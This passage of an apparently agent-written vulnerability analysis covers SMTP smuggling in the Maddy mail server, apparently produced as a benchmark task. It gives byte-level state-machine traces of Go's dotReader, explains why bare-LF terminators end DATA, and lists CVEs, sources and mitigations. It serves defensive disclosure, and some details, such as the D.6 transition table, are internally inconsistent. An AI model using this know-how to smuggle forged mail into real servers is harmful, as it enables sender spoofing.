Bare-CR \r.\r: (starting in stateData)
  (stateData)    \r → stateCR
  (stateCR)      . → unread '.'; emit \r; → stateData  [emits 0x0d]
  (stateData)    . → emit '.'; stay stateData          [emits 0x2e]
  (stateData)    \r → stateCR
  (stateCR)      [next byte non-LF] → unread; emit \r; → stateData  [emits 0x0d]
  Result: bytes 0d 2e 0d appear in delivered body; no EOF.

Dot-space \r\n. \r\n: (starting in stateData)
  (stateData)    \r → stateCR
  (stateCR)      \n → stateBeginLine (emit \n)
  (stateBeginLine) . → stateDot                       [dot held, NOT emitted]
  (stateDot)     ' ' (0x20, OTHER) → d.state=stateData, fall through  [emits 0x20, the SPACE]
  (stateData)    \r → stateCR
  (stateCR)      \n → stateBeginLine (emit \n)
  Result: byte 0x20 (space only) appears in delivered body; the
  leading '.' is consumed by dot-unstuffing (RFC 5321 §4.5.2) and
  is NOT emitted; no EOF. §C.6 shows this empirically.

Dot-stuffed ..text: (starting at stateBeginLine)
  (stateBeginLine) . → stateDot                       [first dot held, NOT emitted]
  (stateDot)     . → d.state=stateData, fall through  [emits 0x2e, the SECOND dot]
  (stateData)    t → emit; stay
  ...
  Result: the first dot (dot-stuffing byte) is stripped; the second
  dot is emitted as body content; remaining line delivered
  normally. The net effect is that "..text" on the wire becomes
  ".text" in the delivered body.

Dot mid-line Body.\r\n: (in stateData)
  (stateData)    B → emit
  (stateData)    o → emit
  (stateData)    d → emit
  (stateData)    y → emit
  (stateData)    . → emit; stay stateData  [dot is NOT at start of line]
  (stateData)    \r → stateCR
  (stateCR)      \n → stateBeginLine
  Result: line delivered as "Body.\n"; no termination.
```

These traces confirm that only the four canonical-and-lenient
terminator forms reach `stateEOF`. Every other byte sequence is
treated as body content.

### D.5 ASCII Diagram

A visual representation of the state machine (transitions leading
to `stateEOF` are bold):

```text
                      ┌──────────────────┐
                      │  stateBeginLine  │◄──────────────────┐
                      │    (initial)     │                   │
                      └──┬──┬──┬──┬──────┘                   │
                         │  │  │  │                          │
                  LF     │  │  │  │  CR                      │
             (emit \n)   │  │  │  ▼                          │
                  loop   │  │  │ ┌─────────┐                 │
                         │  │  │ │ stateCR │                 │
                         │  │  │ └────┬────┘                 │
                         │  │  │      │                      │
                         │  │  │      │ LF                   │
                         │  │  │      └──────────────────────┘
                         │  │  │                             
                         │  │  │  DOT                        
                         │  │  ▼                             
                         │  │ ┌──────────┐                   
                         │  │ │ stateDot │                   
                         │  │ └─┬──┬──┬───┘                  
                         │  │   │  │  │                      
                         │  │   │  │  │  LF  ──────────►  ┌──────────┐
                         │  │   │  │  │    (TERMINATE)    │ stateEOF │
                         │  │   │  │  │                   └──────────┘
                         │  │   │  │  │                   
                         │  │   │  │  │  CR               
                         │  │   │  │  ▼                   
                         │  │   │  │ ┌────────────┐       
                         │  │   │  │ │ stateDotCR │       
                         │  │   │  │ └────┬───────┘       
                         │  │   │  │      │               
                         │  │   │  │      │ LF            
                         │  │   │  │      │  (TERMINATE)  
                         │  │   │  │      └──►  stateEOF  
                         │  │   │  │                      
                         │  │   │  │      OTHER/CR/DOT:   
                         │  │   │  │      unread; emit \r;
                         │  │   │  │      → stateData     
                         │  │   │  │                      
                         │  │   │  │  DOT or OTHER        
                         │  │   │  ▼  (emit current byte; → stateData)
                         │  │   │ ┌────────────┐          
                         │  │   └─│ stateData  │◄─────────┐
                         │  │     └──┬──┬──┬───┘          │
                         │  │        │  │  │              │
                         │  │   LF   │  │  │  OTHER/DOT   │
                         │  └────────┘  │  └──(emit; loop)┘
                         │              │                 
                         │              │  CR             
                         │              ▼                 
                         │            stateCR (already shown)
                         │                                
                         │  OTHER (emit; → stateData)     
                         └───────────────────────────────►
```

### D.6 Equivalent Strict State Machine (Hypothetical)

For comparison, the state machine of a **hypothetical strict
dotReader** that only accepts canonical `\r\n.\r\n` would differ
from the lenient version in exactly two transitions:

| State | Input | Lenient action | Strict action |
|-------|-------|----------------|---------------|
| `stateDot` | LF | → `stateEOF` | → `stateData` (emit nothing; treat as protocol error or benign body) |
| `stateBeginLine` | LF | emit `\n`; → `stateData` | (no change needed — emit/transition unaffected by strict mode) |

Only one state transition is materially different: the `stateDot`
+ LF transition would no longer lead to `stateEOF`. The strict
version would require the `stateDot` → `stateDotCR` → `stateEOF`
path exclusively, and `stateDotCR` would require `\n` after `\r`
to complete termination. With these changes, `\n.\n`, `\r\n.\n`,
and `\n.\r\n` terminators would all be rejected (or, more
precisely, would never trigger termination), and only `\r\n.\r\n`
would terminate DATA.

This is essentially the change that Section 8.3 and 8.5 propose
as a potential mitigation.

### D.7 Normalisation Behaviour Table

In addition to terminator detection, the dotReader performs a
side-effect normalisation: bare `\r` that is not part of a CRLF
sequence is preserved, but CRLF sequences in the body are
normalised to LF. This is driven by the following emissions:

| Input sequence | Emitted bytes |
|----------------|---------------|
| `\r\n` (in `stateData` → `stateCR` → `stateBeginLine`) | `\n` (one byte) |
| `\n` (in `stateData` → `stateBeginLine`) | `\n` (one byte) |
| `\n` (in `stateBeginLine` → `stateBeginLine`, blank line) | `\n` (one byte) |
| `\r` followed by non-`\n` (in `stateData` → `stateCR` → unread) | `\r` + next byte |
| Any other byte (in `stateData` or `stateBeginLine`) | itself |

**Observation**: The mapping `\r\n → \n` is why the delivered body
in Sessions 1 and 2 is byte-identical despite the wire bytes
differing. Every CRLF on the wire is collapsed to a single LF in
the delivered stream.

### D.8 Interaction with `bufio.Reader` Underneath

The dotReader reads from an underlying `bufio.Reader` via
`UnreadByte`/`ReadByte` operations. Two key consequences:

1. **Residual bytes**: If the dotReader has consumed bytes past the
   terminator (not typical in Go's implementation, but
   theoretically possible), those bytes would be "unread" back to
   the `bufio.Reader`. In practice, the dotReader consumes up to
   and including the final `\n` of the terminator and nothing
   beyond.

2. **Shared buffer**: The `bufio.Reader` used by the dotReader is
   the same `bufio.Reader` used by the command-line parser. This
   is the property exploited by SMTP smuggling: residual bytes
   **after** the terminator (bytes that were never consumed by
   the dotReader) remain in the `bufio.Reader` buffer and are the
   first bytes read on the next `ReadLine` call.

### D.9 Initial State and Reset

Each call to `Reader.DotReader()` returns a fresh `*dotReader`
with `state = stateBeginLine`. There is no internal reset or
reuse — every DATA phase in a session gets a brand-new state
machine. This is why the pipelined test in Section 3 shows no
state leakage between transactions: each DATA phase starts with a
pristine `stateBeginLine`.

### D.10 Byte-Level Complexity

The state machine is `O(n)` in the length of the DATA stream: each
input byte advances the state exactly once (with at most one
`unread` operation, which is also `O(1)`). There is no
backtracking or lookahead beyond one byte. This efficiency is
what allows the dotReader to handle multi-megabyte DATA streams
at essentially memory-bandwidth-limited speed.

The efficiency is also what makes strict-mode mitigation
attractive: a strict-mode dotReader would impose zero runtime
overhead beyond what the lenient version already pays, because
the state transitions would simply differ — not add any branches.

### D.11 Confirmation Against Source Code

To cross-check the transitions in §D.2 against the authoritative
source, refer to `/usr/lib/go-1.22/src/net/textproto/reader.go`,
function `(*dotReader).Read` (approximately lines 360–430 of that
file). Each case in the `switch d.state { ... }` block
implements exactly one row of the table. The reader who wishes
to verify the findings directly is encouraged to open the file
and step through each case alongside the table here.

---

## Appendix E — References

### E.1 Standards and RFCs

- **RFC 5321** — Klensin, J., "Simple Mail Transfer Protocol",
  October 2008. The authoritative specification of SMTP. Section
  4.1.1.4 ("DATA (DATA)") defines the canonical DATA terminator as
  `<CRLF>.<CRLF>` and establishes dot-stuffing as the transparency
  mechanism for body lines that begin with a dot.
  `https://datatracker.ietf.org/doc/html/rfc5321`
- **RFC 5322** — Resnick, P. (ed.), "Internet Message Format",
  October 2008. Defines the message format (headers, body, and
  their separation) that the dotReader's output feeds into.
  `https://datatracker.ietf.org/doc/html/rfc5322`
- **RFC 3030** — Vaudreuil, G., "SMTP Service Extensions for
  Transmission of Large and Binary MIME Messages", December 2000.
  The BDAT chunked-transmission extension that, if negotiated,
  avoids the dot-stuffing DATA transport entirely. Maddy does not
  advertise BDAT, so all ingress traffic goes through the dotReader
  path.
  `https://datatracker.ietf.org/doc/html/rfc3030`
- **RFC 2920** — Freed, N., "SMTP Service Extension for Command
  Pipelining", September 2000. Specifies the PIPELINING extension
  that go-smtp (and therefore Maddy) advertises by default. The
  SMTP smuggling attack is enabled in part by clients' freedom to
  send multiple commands in a single TCP segment under PIPELINING.
  `https://datatracker.ietf.org/doc/html/rfc2920`

### E.2 Vulnerability Disclosures

- **CVE-2023-51764** — "SMTP smuggling: an under-the-radar attack
  class". Disclosed by SEC Consult Vulnerability Lab in December
  2023. The disclosure documented that differences in DATA
  terminator recognition between MTAs enable message injection
  with forged envelope senders. This CVE specifically covers
  Postfix; related CVEs (below) cover other implementations.
- **CVE-2023-51766** — Similar class of vulnerability affecting
  Exim.
- **CVE-2023-21709** — Microsoft Exchange Server variant,
  pre-dating the SEC Consult disclosure but addressing related
  bare-LF processing issues.

Maddy has not (as of the commit under analysis) been assigned a
CVE for this class of vulnerability, but the behavioural evidence
in Section 4 of this document establishes that the same class of
vulnerability is present.

### E.3 Source Code References

The following source files are the primary references for the
static-analysis portions of this document. Paths are given relative
to their respective roots.

#### Go Standard Library

- `/usr/lib/go-1.22/src/net/textproto/reader.go` (approximately
  lines 333–445): The `dotReader` struct, its state constants, and
  the `Read` method implementing the six-state FSM analysed in
  Sections 1, 2, 4, and Appendix D.
- `/usr/lib/go-1.22/src/net/textproto/reader.go` (entire file): The
  `Reader` type's `DotReader()` method that instantiates a fresh
  `dotReader` for each DATA phase.
- `/usr/lib/go-1.22/src/net/textproto/writer.go`: The corresponding
  `dotWriter` used by outbound clients — emits canonical
  `\r\n.\r\n` on `Close()`, as referenced in Section 7.17.
- `/usr/lib/go-1.22/src/bufio/bufio.go`: The `Reader` type whose
  shared-buffer property is the substrate for the smuggling
  attack (Sections 4, 5, 7).

#### `github.com/emersion/go-smtp` v0.12.1-0.20191206174923-1f576e0ec85c

Module cache path:
`/root/go/pkg/mod/github.com/emersion/go-smtp@v0.12.1-0.20191206174923-1f576e0ec85c/`

- `conn.go`: `Conn.init()` (lines ~48–76) establishes the
  `lineLimitReader` → optional `io.TeeReader` → `textproto.NewConn`
  chain that creates the shared bufio.Reader. `Conn.handleData`
  (lines ~498–521) invokes `newDataReader(c)` and contains the
  `io.Copy(ioutil.Discard, r)` drain line.
- `data.go`: The `dataReader` struct and `newDataReader` — the
  thin size-limit wrapper around `c.text.DotReader()`.
- `server.go`: `NewServer` with default capabilities
  `["PIPELINING", "8BITMIME", "ENHANCEDSTATUSCODES"]` (around
  line 81). Also the `Server.Serve` and per-connection dispatch
  setup.
- `parse.go`: `parseCmd` — strips trailing `\r\n` from command
  lines; smuggled commands are parsed here.
- `lengthlimit_reader.go`: `lineLimitReader.Read` — resets
  `curLineLength` on any `\n`, permitting bare-LF lines to pass
  the length check.
- `client.go` and `client_test.go`: The client-side DotWriter
  usage and injection-protection tests (which verify that the
  client cannot be tricked into injecting into its own DATA
  stream — a separate property from the server-side smuggling
  addressed here).

#### Maddy (commit `26452dd`)

Repository root: the working tree at
`/tmp/blitzy/maddy/blitzy-d36d8157-fc5f-4567-bca8-1c27576d5d16_3ca2c7`.

- `go.mod`: Declares `go 1.13` minimum and pins go-smtp to
  `v0.12.1-0.20191206174923-1f576e0ec85c`.
- `go.sum`: Cryptographic checksums for all pinned modules.
- `internal/endpoint/smtp/smtp.go`:
  - `Session.prepareBody` (lines 283–310): Reads header via
    `textproto.ReadHeader`, buffers body via
    `buffer.BufferInMemory`, adds `Received:` header.
  - `Session.Data` (lines 312–344): Calls `prepareBody`,
    `delivery.Body`, `delivery.Commit`, logs `accepted`.
  - `io_debug` config wiring (around lines 554, 565, 603–606):
    the path from `maddy.conf` to `endp.serv.Debug`.
- `internal/endpoint/smtp/smtp_test.go` (lines 25–28): `testMsg`
  constant using only canonical `\r\n` line endings; no bare-LF
  tests.
- `internal/endpoint/smtp/submission.go`: `submissionPrepare` for
  port-587 submission endpoints; does not affect terminator
  handling.
- `internal/endpoint/smtp/date.go`: RFC 5322 date formatting for
  the `Received:` header; not relevant to terminator behaviour.
- `internal/smtpconn/smtpconn.go` (lines 303–324): `C.Data` for
  outbound relay; uses canonical `\r\n.\r\n` via the stdlib
  dotWriter.
- `internal/buffer/memory.go` (lines 27–33): `BufferInMemory`
  invokes `ioutil.ReadAll` to consume everything up to EOF.
- `internal/log/log.go` (lines 172–178): `Logger.DebugWriter`
  returns `ioutil.Discard` when `l.Debug` is false.
- `maddy.go`: `Run()` entrypoint and global configuration parsing.

#### Maddy Referenced But Not Modified

These files are part of the Maddy codebase and were examined for
completeness but do not directly affect DATA-boundary parsing:

- `cmd/maddy/main.go`: Main entry point (delegates to
  `maddy.Run`).
- `internal/msgpipeline/msgpipeline.go`: Message routing pipeline
  (runs checks, modifiers, targets).
- `internal/buffer/buffer.go`: The `Buffer` interface.
- `internal/buffer/file.go`: File-backed buffer strategy
  (alternative to memory).
- `internal/target/queue/queue.go`: Queue-based delivery target.
- `internal/target/remote/remote.go`: Remote delivery target.
- `internal/testutils/smtp_server.go`: Test helpers reused by
  `internal/endpoint/smtp/smtp_test.go`.

### E.4 External Technical References

- **Go `net/textproto` package documentation**:
  `https://pkg.go.dev/net/textproto` — official documentation of
  the `Reader.DotReader` method. The behavioural description in
  the documentation is consistent with the state machine in
  Appendix D.
- **Go `bufio` package documentation**:
  `https://pkg.go.dev/bufio` — the `Reader` type and its buffering
  semantics that enable the smuggling attack.
- **Go `io` package documentation**: `https://pkg.go.dev/io` —
  the `io.Copy`, `io.TeeReader`, and `io.MultiWriter` functions
  used in go-smtp's DATA-phase plumbing.

### E.5 Ecosystem Mitigation Documentation

- **Postfix release notes and configuration documentation** for
  `smtpd_forbid_bare_newline` and
  `smtpd_forbid_bare_newline_exclusions`. Postfix's approach is
  the closest analogue to the Option 2 mitigation discussed in
  Section 8.4.
- **Exim release notes** covering `allow_bare_newlines`.
- **Sendmail `srv_features` documentation** covering the `O`
  flag for bare-LF rejection.

These references serve as prior art for the recommended
`forbid_bare_newline` configuration flag for Maddy described in
Section 8.4.

### E.6 Container and Environment References

- **Docker image**:
  `andrewparkscaleai/coding-agent:foxcpp__maddy__26452dd8dd787dc455278b0fdd296f4a5432c768`
  sourced from
  `ghcr.io/scaleapi/swe-atlas:swe_atlas_QnA_foxcpp_maddy_1.0`.
  The image provides the exact Go toolchain and module cache
  state documented in Appendix A.

### E.7 Glossary of Acronyms and Terms

- **AAP** — Agent Action Plan. The directive document preceding
  this analysis.
- **BDAT** — Binary Data command (RFC 3030); chunked DATA
  alternative.
- **BufIO** — Go's `bufio` package; buffered I/O primitives.
- **CRLF** — Carriage Return + Line Feed (`\r\n`, bytes `0d 0a`).
- **CVE** — Common Vulnerabilities and Exposures.
- **DATA** — The SMTP command that precedes message body
  transmission (RFC 5321 § 3.3).
- **dot-stuffing** — The transparency mechanism in RFC 5321 where
  a body line beginning with `.` is sent with an extra `.`
  prepended on the wire; the receiver strips the extra dot.
- **EHLO** — Extended HELO; the SMTP command that begins a
  session and discovers server capabilities (RFC 5321 § 3.1.2).
- **EOF** — End of file; in Go, the sentinel error `io.EOF`
  returned to signal stream termination.
- **FSM** — Finite State Machine.
- **HELO** — The original SMTP greeting command (RFC 821,
  superseded by EHLO).
- **LF** — Line Feed byte (`\n`, byte `0a`).
- **LHLO** — LMTP Hello.
- **LMTP** — Local Mail Transfer Protocol (RFC 2033).
- **MAIL FROM** — The SMTP command setting the envelope sender
  (RFC 5321 § 3.3).
- **MTA** — Mail Transfer Agent. The role of servers like Maddy,
  Postfix, Exim, Sendmail.
- **MX** — Mail Exchanger (DNS record type).
- **NOOP** — No-Operation SMTP command; used for probes.
- **PIPELINING** — SMTP extension (RFC 2920) allowing clients to
  send multiple commands without waiting for intermediate
  responses.
- **RCPT TO** — The SMTP command specifying an envelope recipient
  (RFC 5321 § 3.3).
- **RSET** — Reset; SMTP command that clears mail transaction
  state without closing the session.
- **SMTP** — Simple Mail Transfer Protocol (RFC 5321).
- **stateBeginLine**, **stateData**, **stateDot**, **stateDotCR**,
  **stateCR**, **stateEOF** — The six states of the `dotReader`
  finite state machine.
- **Submission** — SMTP message submission on port 587 (RFC 6409).
- **TCP** — Transmission Control Protocol.
- **TLS** — Transport Layer Security.
- **textproto** — Go's `net/textproto` package.

### E.8 Document Provenance

- **Source branch**: `maddy_26452dd8dd78`
- **Working branch**: `blitzy-d36d8157-fc5f-4567-bca8-1c27576d5d16`
- **Document filename**: `maddy_26452dd8dd78.md`
- **Document location**: `blitzy/documentation/maddy_26452dd8dd78.md`
- **Analysis agent**: Principal Software Engineer autonomous agent
  on the Blitzy Platform.
- **Scope**: Observational, evidence-based runtime behavioural
  analysis. No existing repository files modified.

### E.9 Final Notes

This document is self-contained. A reader with no prior knowledge
of Maddy, go-smtp, or the Go standard library should be able to:

1. Reproduce the environment described in Appendix A.
2. Construct the test harness described in Appendix A and run the
   scenarios in Appendix B.
3. Verify the hex-level evidence in Appendix C byte-for-byte
   against their own test runs.
4. Cross-check the state machine in Appendix D against the Go
   source file cited in that appendix.
5. Follow the code references in Section 7 to understand why the
   observed behaviour arises at the source-code level.
6. Consider the mitigation options in Section 8 for their own
   deployments.

The findings may be summarised in one sentence: **Maddy inherits,
from Go's lenient `net/textproto.dotReader`, a DATA-terminator
recognition policy that accepts bare-LF variants in addition to the
canonical `\r\n.\r\n`, making it vulnerable to the SMTP smuggling
attack class (CVE-2023-51764 and siblings), with no effective
mitigation available via a naïve strict front-proxy.**

---

*End of document.*


